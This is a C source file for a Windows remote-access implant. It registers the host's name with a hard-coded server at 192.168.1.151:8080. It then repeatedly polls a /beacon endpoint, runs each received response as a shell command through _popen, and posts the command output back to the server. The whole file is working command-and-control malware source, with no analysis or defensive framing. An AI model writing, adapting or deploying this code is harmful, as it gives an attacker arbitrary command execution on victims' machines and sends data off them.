#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <winhttp.h>

HINTERNET hSession = NULL, hConnect = NULL;

int sendOutput(char *output)
{
    HINTERNET hRequest = NULL;
    BOOL bResults = FALSE;
    DWORD outputLen = strlen(output);

    hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/response", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if(hRequest)
        bResults = WinHttpSendRequest(hRequest, L"Content-Type: text/plain\r\n", -1, (LPVOID)output, outputLen, outputLen, 0);
    if(hRequest) WinHttpCloseHandle(hRequest);
    if(bResults)
        return 0;
    else
        return 1;
}

int sendHostname()
{
    char hostname[1024];
    gethostname(hostname, sizeof(hostname) - 1);
    strcat(hostname, "\n");
    HINTERNET hRequest = NULL;
    BOOL bResults = FALSE;
    DWORD hostnameLen = strlen(hostname);
    

    hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/hostname", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if(hRequest)
        bResults = WinHttpSendRequest(hRequest, L"Content-Type: text/plain\r\n", -1, (LPVOID)hostname, hostnameLen, hostnameLen, 0);
    if(hRequest) WinHttpCloseHandle(hRequest);
    if(bResults)
        return 0;
    else
        return 1;
}

int executeCommands(char *command)
{
   char output[65536];
   char line[256];
   output[0] = '\0';

   FILE *f = _popen(command, "r");
   if(f == NULL)
    return 1;

   while(fgets(line, sizeof(line), f) != NULL)
        strcat(output, line);

    _pclose(f);
    sendOutput(output);
    return 0;
}

int beacon()
{
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    BOOL bResults = FALSE;
    HINTERNET hRequest = NULL;
    char hostname[1024];
    gethostname(hostname, sizeof(hostname) - 1);
    wchar_t header[2048];
    swprintf(header, 2048, L"X-Hostname: %hs\r\n", hostname);

    while(1)
    {
        hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/beacon", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
        if(hRequest)
            bResults = WinHttpSendRequest(hRequest, header, -1, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);

        if(bResults)
            bResults = WinHttpReceiveResponse(hRequest, NULL);

        if(bResults)
        {
            do
            {
                dwSize = 0;
                if(!WinHttpQueryDataAvailable(hRequest, &dwSize))
                    printf("Error %u in WinHttpQueryDataAvailable.\n", GetLastError());

                char pszOutBuffer[dwSize+1];
                ZeroMemory(pszOutBuffer, dwSize+1);

                if(!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded))
                    printf("Error %u in WinHttpReadData\n", GetLastError());
                else if(dwDownloaded > 0)
                    executeCommands(pszOutBuffer);

            } while(dwSize > 0);
        }
       

        //Sleep(10000);
    }
     if(hConnect) WinHttpCloseHandle(hConnect);
     if(hSession) WinHttpCloseHandle(hSession);
    
    return 0;
}




int main()
{
    hSession = WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if(hSession)
        hConnect = WinHttpConnect(hSession, L"192.168.1.151", 8080, 0);

    sendHostname();
    beacon();
    return 0;
}
